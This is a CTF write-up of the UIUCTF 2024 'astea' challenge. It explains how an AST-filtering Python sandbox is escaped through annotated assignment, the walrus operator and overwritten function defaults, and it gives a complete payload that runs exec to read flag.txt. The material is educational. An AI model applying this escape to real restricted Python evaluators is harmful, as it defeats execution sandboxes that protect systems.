---
author: "nothoudaifa"
title: "astea chall writeup from uiuctf 2024"
date: "2024-06-25"
tags: 
- ctf 
- misc 
---

## Understanding the code:

We are given this python file

```python
import ast

def safe_import():
  print("Why do you need imports to make tea?")

def safe_call():
  print("Why do you need function calls to make tea?")

class CoolDownTea(ast.NodeTransformer):
  def visit_Call(self, node: ast.Call) -> ast.AST:
    return ast.Call(func=ast.Name(id='safe_call', ctx=ast.Load()), args=[], keywords=[])
  
  def visit_Import(self, node: ast.AST) -> ast.AST:
    return ast.Expr(value=ast.Call(func=ast.Name(id='safe_import', ctx=ast.Load()), args=[], keywords=[]))
  
  def visit_ImportFrom(self, node: ast.ImportFrom) -> ast.AST:
    return ast.Expr(value=ast.Call(func=ast.Name(id='safe_import', ctx=ast.Load()), args=[], keywords=[]))
  
  def visit_Assign(self, node: ast.Assign) -> ast.AST:
    return ast.Assign(targets=node.targets, value=ast.Constant(value=0))
  
  def visit_BinOp(self, node: ast.BinOp) -> ast.AST:
    return ast.BinOp(left=ast.Constant(0), op=node.op, right=ast.Constant(0))
  
code = input('Nothing is quite like a cup of tea in the morning: ').splitlines()[0]

cup = ast.parse(code)
cup = CoolDownTea().visit(cup)
ast.fix_missing_locations(cup)

exec(compile(cup, '', 'exec'), {'__builtins__': {}}, {'safe_import': safe_import, 'safe_call': safe_call})
```

> i used chatgpt to understand most of this.
> 

this python file takes your code and parse’s it using the ast python module.

> check the [docs](https://docs.python.org/3/library/ast.html) for the ast module.
> 

after parsing it, it runs it through CoolDownTea().visit function. the CoolDownTea class inherits from ast.NodeTransformer, what this does is go through the generated ast and change the nodes in it based on the defined functions in the CoolDownTea Class.

the CoolDownTea class does 4 things:

- it turns any function call it sees into a call of the safe_call function.
- it turns any import syntax (import module, from module import a) into a call to safe_import function.
- it turns any assignment (specificaly ast.Assign nodes in the ast, this will be important later) into a zero assignment eg: a=2 will become a = 0.
- it turns any binary operation into the binary operation on two zeros so 1+1 would become 0+0.

after that, it compiles and executes the code using exec it sets __builtins__ to {} and sets two functions safe_call and safe_import.

## Exploration:

Looking at this from afar it seems impossible to do anything since we don’t have any builtin function and even if we did we can’t call because it will be changed to safe_call call.

> or is it?
> 

in python, functions have their own __builtins__ which basically includes all the builtin functions we know and love so we can use that.

> now what?
we still can’t call any functions.
> 

remember that we are using python, if we can assign the safe_call function to a builtin function from it’s builtins we are technically calling that function by calling safe_call. something like this:

```python
safe_call = safe_call.__builtins__['print']
```

the problem in here that this assignment will become (because of the NodeTransformer):

```python
safe_call = 0
```

> is there another way to an assignment in python.
> 

it turns out there is.
after taking a look at all the nodes in the ast module [docs](https://docs.python.org/3/library/ast.html), it turns out there are four types of assignments:

- ast.Assign: the normal assignment we know
- ast.AugAssign: augmented assignment eg: x+= 2, a |= 1.
- ast.AnnAssign: just the normal assignment with a type annontiation.
- ast.NamedExpr: this is the walrus operator (this assignment does have some constraints).

and as it turns out, the CoolDownTea class only checks for normal assignments, which means we can use annontiated assignments to our heats content.

> Cool
Now we can get the flag right?
> 

In this case we can directly edit license._Printer__filenames and make it point to flag.txt then call license functions.
but obviously i didn’t do that (i didn't know about it then).

what i thought after reaching this is that i can call any builtin function but with no arguments.
so is there anything in the python builtins that can help me.

> None, or at least i have not found anything
> 

until i discovered something, when u define a function with default arguments:

```python
def func(name='cool', age=2):
	pass
```

this is actually reflected in one of the function propreties, specifically __defaults__ , it would look like this for func:

```python
func.__defaults__ == ('cool', 2)
```

> cool
now we just gotta edit exec’s __defaults__ with our payload and we win.
> 

builtin functions in python does not have the __defaults__ field.

but that’s not a problem, if there is a function that is user made and it uses it’s arguments to call any builtin function we can use that, the builtin function does not matter since we can change it using:

```python
func.__builtins__['ord'] = func.__builtins__['exec']
```

> safe_call and safe_import do not match
we can also access the global scope using safe_call.__globals__ but none of the functions satisfy the requirements.
> 

until i noticed the fact the the global scope also contains the imported ast module, and it turns out all the functions in it have the __defaults__ attribute.
so i checked the [source code](https://github.com/python/cpython/blob/main/Lib/ast.py) for the ast module.

> so is there any function in there?
> 

Yes. after 2 mins of searching i found it.

the “_Unparser.interleave” function:

```python
class _Unparser:
		def interleave(self, inter, f, seq):
		    """Call f on each item in seq, calling inter() in between."""
		    seq = iter(seq)
		    try:
		        f(next(seq))
		    except StopIteration:
		        pass
		    else:
		        for x in seq:
		            inter()
		            f(x)
```

as u can see from the description of the function it’s just perfect.

## Exploit crafting:

- first, we gotta edit the __defaults__ of the interleave function, what we care about is f (function to be called), and seq (args for that function).
    
    we set it to call exec on “print(open(’flag.txt’).read())”
    

```python
safe_call.__globals__['ast']._Unparser.interleave.__defaults__: safe_call.__builtins__['tuple'] =  (None, None, safe_call.__builtins__['exec'], ['print(open("flag.txt").read())']) ;
```

- second, we assign the safe_call function to interleave function.

```python
(safe_call:= safe_call.__globals__['ast']._Unparser.interleave)
```

- finally, we call the safe_call function

```python
safe_call()
```

our final exploit will be:

```python
safe_call.__globals__['ast']._Unparser.interleave.__defaults__: safe_call.__builtins__['tuple'] =  (None, None, safe_call.__builtins__['exec'], ['print(open("flag.txt").read())']) ; (safe_call:= safe_call.__globals__['ast']._Unparser.interleave) ; safe_call()
```

FLAG: uiuctf{maybe_we_shouldnt_sandbox_python_2691d6c1}
